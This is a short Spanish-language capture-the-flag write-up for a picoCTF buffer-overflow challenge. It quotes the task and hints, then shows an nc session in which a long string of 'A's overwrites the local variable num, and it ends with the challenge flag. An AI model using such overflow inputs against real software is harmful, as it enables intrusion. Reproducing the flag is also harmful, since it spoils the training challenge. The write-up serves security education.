## Descripcion
Smash the stackCan you overflow the buffer and modify the other local variable? The program is available [here](https://artifacts.picoctf.net/c/517/local-target). You can view source [here](https://artifacts.picoctf.net/c/517/local-target.c). And connect with it using:`nc saturn.picoctf.net 53418`

## Pistas
Do anything you can to change `num`.
When you change `num`, view the value as hexadecimal.

## Solucion
Se introduce la cadena necesaria para cambiar el valor de la variable num
```bash
frogger00-picoctf@webshell:~$ nc saturn.picoctf.net 53418
Enter a string: AAAAAAAAAAAAAAAAAAAAAAAAA

num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_fee8ef05}
```

## Bandera
picoCTF{l0c4l5_1n_5c0p3_fee8ef05}

## Notas




